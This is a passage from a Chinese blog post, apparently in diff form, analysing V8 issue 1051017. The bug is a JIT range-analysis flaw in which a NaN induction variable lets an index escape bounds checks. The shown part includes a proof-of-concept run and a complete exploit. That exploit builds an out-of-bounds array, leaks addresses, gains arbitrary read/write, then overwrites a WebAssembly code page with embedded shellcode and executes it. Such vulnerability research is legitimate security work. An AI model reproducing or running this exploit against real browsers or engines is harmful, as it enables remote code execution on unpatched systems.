-Infinity;</span><br><span class="line">    var i = 0;</span><br><span class="line">    for (; i &lt; 1; i += x) &#123;</span><br><span class="line">        if (i == -Infinity) x = +Infinity;</span><br><span class="line">    &#125;</span><br><span class="line">    //compiler:Range(1,INF)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    var x = Math.max(i,1); //</span><br><span class="line">    //compiler:Range(-INF,-1)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    x = -x; //</span><br><span class="line">    //compiler:Range(-2,-1)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    x = Math.max(x,-2);</span><br><span class="line">    //compiler:Range(-2,-1)</span><br><span class="line">    //reality:0</span><br><span class="line">    x &gt;&gt;= 0; //</span><br><span class="line">    //compiler:Range(0,1)</span><br><span class="line">    //reality:2</span><br><span class="line">    x += 2;</span><br><span class="line">    //compiler:Range(0,7)</span><br><span class="line">    //reality:Range(0,7)</span><br><span class="line">    index &amp;= 0x7;</span><br><span class="line">    //compiler:Range(0,7)</span><br><span class="line">    //reality:Range(0,14)</span><br><span class="line">    index *= x;</span><br><span class="line">    index &lt;&lt;= 1;</span><br><span class="line">    index &gt;&gt;= 1;</span><br><span class="line">    return a[index];</span><br><span class="line">&#125;</span><br><span class="line">%PrepareFunctionForOptimization(opt);</span><br><span class="line">print(opt(5));</span><br><span class="line">%OptimizeFunctionOnNextCall(opt);</span><br><span class="line">print(opt(5));</span><br><span class="line">%SystemBreak();</span><br><span class="line">print(opt(5));</span><br></pre></td></tr></table></figure>
+<p>运行后发现成功溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/v8/out.gn/x64.bug# ./d8 p.js --allow-natives-syntax</span><br><span class="line">undefined</span><br><span class="line">-8.864952837205469e-7</span><br></pre></td></tr></table></figure>
+<h3 id="疑难问题"><a href="#疑难问题" class="headerlink" title="疑难问题"></a>疑难问题</h3><p>在构造过程中,<code>var x = Math.max(i,1);</code>和<code>x = Math.max(x,-2);</code>语句中的参数，位置不能调换，否则利用失败。<br>这是因为<code>max</code>函数最终是会被转换为<code>Float64LessThan</code>函数，<br><img src="https://p1.ssl.qhimg.com/t014313a74ce69645a6.png"><br>而对于一个<code>NaN</code>，任何的比较都是false，因此在这个情况下，<code>max</code>运算的真实结果将会是第一个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NaN == NaN</span><br><span class="line">false</span><br><span class="line">NaN &lt; 1</span><br><span class="line">false</span><br><span class="line">NaN &gt; 1</span><br><span class="line">false</span><br></pre></td></tr></table></figure>
+<p>而我们的目的就是要让<code>NaN</code>参与真实值的计算，因此，不能调换参数的位置。<br>能否使用<code>var x = i &lt; 1 ? 1 : i</code>来代替<code>max</code>函数？答案是不行。<br><img src="https://p0.ssl.qhimg.com/t010e30c9f64a344b51.png"><br>这将导致<code>var x = i &lt; 1 ? 1 : i</code>这个<code>Phi</code>节点与<code>i</code>的估测一致，同为<code>Range(-INF,INF)</code>，因为从程序的流程分析来看，显然<code>i &lt; 1</code>是恒不成立的，因为刚刚循环退出的条件就是<code>i &gt;= 1</code>，因此，<code>var x = i &lt; 1 ? 1 : i</code>就相当于<code>var x = i</code>，在后面，编译器直接评估它与i的情况一样，同为<code>Range(-inf,inf)</code>，由此不能达到我们的利用目的。同理，<code>var x = i &gt; 1 ? i : 1;</code>也不可行，它将使得i为<code>NaN</code>时，x的值为1。</p>
+<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>控制好对象布局，利用JIT的oob，覆写后方<code>Array</code>的length，从而构造一个自由溢出的<code>OOB Array</code>，然后后续就是简单的利用了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return [dv.getUint32(0,true),dv.getUint32(4,true)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function big2int(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getUint32(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a;</span><br><span class="line">var oob_arr;</span><br><span class="line">function opt(index,leak_or_write,val) &#123;</span><br><span class="line">    a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8];</span><br><span class="line">    oob_arr = new Array(1.1,2.2);</span><br><span class="line">    var x = -Infinity;</span><br><span class="line">    var i = 0;</span><br><span class="line">    for (; i &lt; 1; i += x) &#123;</span><br><span class="line">        if (i == -Infinity) x = +Infinity;</span><br><span class="line">    &#125;</span><br><span class="line">    //compiler:Range(1,INF)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    var x = Math.max(i,1); //</span><br><span class="line">    //compiler:Range(-INF,-1)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    x = -x; //</span><br><span class="line">    //compiler:Range(-2,-1)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    x = Math.max(x,-2); //</span><br><span class="line">    //compiler:Range(-2,-1)</span><br><span class="line">    //reality:0</span><br><span class="line">    x &gt;&gt;= 0; //</span><br><span class="line">    //compiler:Range(0,1)</span><br><span class="line">    //reality:2</span><br><span class="line">    x += 2;</span><br><span class="line">    //compiler:Range(0,7)</span><br><span class="line">    //reality:Range(0,7)</span><br><span class="line">    index &amp;= 0x7;</span><br><span class="line">    //compiler:Range(0,7)</span><br><span class="line">    //reality:Range(0,14)</span><br><span class="line">    index *= x;</span><br><span class="line">    /*两步的作用是清除符号位*/</span><br><span class="line">    index &lt;&lt;= 1;</span><br><span class="line">    index &gt;&gt;= 1;</span><br><span class="line">    if (leak_or_write)</span><br><span class="line">       return a[index];</span><br><span class="line">   else &#123;</span><br><span class="line">      a[index] = val;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(7,true,i+1.1);</span><br><span class="line">   opt(7,false,p64f(0,0));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//泄露arr的elements,用于覆写length时不破坏elements</span><br><span class="line">var d = u64f(opt(7,true,1.1));</span><br><span class="line">var elements_addr = d[0];</span><br><span class="line">print(&quot;elements_addr=&quot; + elements_addr.toString(16));</span><br><span class="line"></span><br><span class="line">var oob_len = p64f(elements_addr,0x1000);</span><br><span class="line">opt(7,false,oob_len);</span><br><span class="line">var float64_arr = new Float64Array(1.1,2.2,3.3);</span><br><span class="line">var arb_buf = new ArrayBuffer(0x10);</span><br><span class="line">var obj_arr = [buf];</span><br><span class="line"></span><br><span class="line">compression_high = u64f(oob_arr[0x32])[0];</span><br><span class="line">obj_elements_map_addr = u64f(oob_arr[0x3c])[1];</span><br><span class="line">double_elements_map_addr = u64f(oob_arr[0x22])[1];</span><br><span class="line">print(&quot;compression_high=&quot; + compression_high.toString(16));</span><br><span class="line">print(&quot;obj_elements_map_addr=&quot; + obj_elements_map_addr.toString(16));</span><br><span class="line">print(&quot;double_elements_map_addr=&quot; + double_elements_map_addr.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function addressOf(mobj) &#123;</span><br><span class="line">   obj_arr[0] = mobj;</span><br><span class="line">   oob_arr[0x3c] = p64f(0,double_elements_map_addr);</span><br><span class="line">   var addr = BigInt(u64f(obj_arr[0])[0]) - 0x1n + (BigInt(compression_high) &lt;&lt; 32n);</span><br><span class="line">   oob_arr[0x3c] = p64f(0,obj_elements_map_addr);</span><br><span class="line">   return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*print(addressOf(buf).toString(16));</span><br><span class="line">//%DebugPrint(buf);</span><br><span class="line">%SystemBreak(); */</span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x68n;</span><br><span class="line">print(wasm_shellcode_ptr_addr.toString(16));</span><br><span class="line"></span><br><span class="line">oob_arr[0x36] = p64f(0,0x100);</span><br><span class="line">oob_arr[0x37] = p64f(0,big2int(wasm_shellcode_ptr_addr));</span><br><span class="line">oob_arr[0x38] = p64f(compression_high,0);</span><br><span class="line">var adv = new DataView(arb_buf);</span><br><span class="line">var wasm_shellcode_addr = adv.getBigUint64(0,true);</span><br><span class="line">print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));</span><br><span class="line"></span><br><span class="line">oob_arr[0x37] = p64f(0,big2int(wasm_shellcode_addr));</span><br><span class="line">oob_arr[0x38] = p64f(big2int(wasm_shellcode_addr &gt;&gt; 32n),0);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br><span class="line"></span><br><span class="line">/*%DebugPrint(wasmInstance);</span><br><span class="line">%DebugPrint(oob_arr);</span><br><span class="line">%DebugPrint(arb_buf);</span><br><span class="line">%SystemBreak();</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-感想"><a href="#0x04-感想" class="headerlink" title="0x04 感想"></a>0x04 感想</h2><p>最近研究v8越来越上手了，以后还得继续努力。</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a target="_blank" rel="noopener" href="https://www.docin.com/p-1633488008.html">论文Interprocedural Induction Variable Analysis</a><br><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8.git/+/a2e971c56d1c46f7c71ccaf33057057308cc8484%5E!/">chromium commit</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/31/34c3ctf-v9/" rel="prev" title="34c3ctf-v9">
+      <i class="fa fa-chevron-left"></i> 34c3ctf-v9
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/03/11/AntCTFxD3CTF-hackphp/" rel="next" title="AntCTFxD3CTF_hackphp">
+      AntCTFxD3CTF_hackphp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-issue-1051017-%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x02 issue 1051017 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">调试分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞修复分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-issue-1051017-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">0x03 issue 1051017 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#OOB%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0"><span class="nav-number">4.1.</span> <span class="nav-text">OOB数组构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%96%91%E9%9A%BE%E9%97%AE%E9%A2%98"><span class="nav-number">4.2.</span> <span class="nav-text">疑难问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp%E7%BC%96%E5%86%99"><span class="nav-number">4.3.</span> <span class="nav-text">exp编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%84%9F%E6%83%B3"><span class="nav-number">5.</span> <span class="nav-text">0x04 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
